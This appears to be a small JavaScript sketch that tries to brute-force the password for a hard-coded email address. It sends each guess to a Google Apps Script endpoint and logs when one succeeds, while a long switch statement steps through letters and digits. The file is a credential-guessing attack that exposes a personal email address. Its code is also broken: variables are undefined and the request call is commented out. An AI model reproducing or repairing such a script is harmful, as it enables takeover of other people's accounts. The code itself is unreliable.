let testing = "a";

function setup(){
  noCanvas();
}

function draw(){
  document.getElementById('brute').innerHTML = "Currently testing: " + testing;
  // test(testing);
  plus(testing);
}

function test(s){
  fetch('https://script.google.com/macros/s/AKfycbxynUgNo8D6azA9D1c-_G6yi9aG6f6H5JbHu7ZbyfbpSTVd3N8/exec?email=borgersbenjamin@gmail.com&password=' + s)
  .then(function(response) {
    return response.json();
  })
  .then(function(json) {
    if(json.clientInfo[0] != undefined && run) {
      console.log("SUCCESS with " + testing);
      run = false;
    } else {
      console.log("fail on " + testing);
    }
  });
}

function plus(s){
  let lastChar = s.substring(s.length-1, s.length);
  switch(lastChar){
    case "a": testing = s.substring(0, length-2) + "b"; break;
    case "b": testing = s.substring(0, length-2) + "c"; break;
    case "c": testing = s.substring(0, length-2) + "d"; break;
    case "d": testing = s.substring(0, length-2) + "e"; break;
    case "e": testing = s.substring(0, length-2) + "f"; break;
    case "f": testing = s.substring(0, length-2) + "g"; break;
    case "g": testing = s.substring(0, length-2) + "h"; break;
    case "h": testing = s.substring(0, length-2) + "i"; break;
    case "i": testing = s.substring(0, length-2) + "j"; break;
    case "j": testing = s.substring(0, length-2) + "k"; break;
    case "k": testing = s.substring(0, length-2) + "l"; break;
    case "l": testing = s.substring(0, length-2) + "m"; break;
    case "m": testing = s.substring(0, length-2) + "n"; break;
    case "n": testing = s.substring(0, length-2) + "o"; break;
    case "o": testing = s.substring(0, length-2) + "p"; break;
    case "p": testing = s.substring(0, length-2) + "q"; break;
    case "q": testing = s.substring(0, length-2) + "r"; break;
    case "r": testing = s.substring(0, length-2) + "s"; break;
    case "s": testing = s.substring(0, length-2) + "t"; break;
    case "t": testing = s.substring(0, length-2) + "u"; break;
    case "u": testing = s.substring(0, length-2) + "v"; break;
    case "v": testing = s.substring(0, length-2) + "w"; break;
    case "w": testing = s.substring(0, length-2) + "x"; break;
    case "x": testing = s.substring(0, length-2) + "y"; break;
    case "y": testing = s.substring(0, length-2) + "z"; break;
    case "z": testing = s.substring(0, length-2) + "A"; break;
      case "A": testing = s.substring(0, length-2) + "B"; break;
      case "B": testing = s.substring(0, length-2) + "C"; break;
      case "C": testing = s.substring(0, length-2) + "D"; break;
      case "D": testing = s.substring(0, length-2) + "E"; break;
      case "E": testing = s.substring(0, length-2) + "F"; break;
      case "F": testing = s.substring(0, length-2) + "G"; break;
      case "G": testing = s.substring(0, length-2) + "H"; break;
      case "H": testing = s.substring(0, length-2) + "I"; break;
      case "I": testing = s.substring(0, length-2) + "J"; break;
      case "J": testing = s.substring(0, length-2) + "K"; break;
      case "K": testing = s.substring(0, length-2) + "L"; break;
      case "L": testing = s.substring(0, length-2) + "M"; break;
      case "M": testing = s.substring(0, length-2) + "N"; break;
      case "N": testing = s.substring(0, length-2) + "O"; break;
      case "O": testing = s.substring(0, length-2) + "P"; break;
      case "P": testing = s.substring(0, length-2) + "Q"; break;
      case "Q": testing = s.substring(0, length-2) + "R"; break;
      case "R": testing = s.substring(0, length-2) + "S"; break;
      case "S": testing = s.substring(0, length-2) + "T"; break;
      case "T": testing = s.substring(0, length-2) + "U"; break;
      case "U": testing = s.substring(0, length-2) + "V"; break;
      case "V": testing = s.substring(0, length-2) + "W"; break;
      case "W": testing = s.substring(0, length-2) + "X"; break;
      case "X": testing = s.substring(0, length-2) + "Y"; break;
      case "Y": testing = s.substring(0, length-2) + "Z"; break;
      case "Z": testing = s.substring(0, length-2) + "0"; break;
      case "0": testing = s.substring(0, length-2) + "1"; break;
      case "1": testing = s.substring(0, length-2) + "2"; break;
      case "2": testing = s.substring(0, length-2) + "3"; break;
      case "3": testing = s.substring(0, length-2) + "4"; break;
      case "4": testing = s.substring(0, length-2) + "5"; break;
      case "5": testing = s.substring(0, length-2) + "6"; break;
      case "6": testing = s.substring(0, length-2) + "7"; break;
      case "7": testing = s.substring(0, length-2) + "8"; break;
      case "8": testing = s.substring(0, length-2) + "9"; break;
      case "9": addOne();
  }
}
function addOne(){
  testing = s.substring(0, length-2) + "a";
  testing+="a";


  console.log(testing);
}
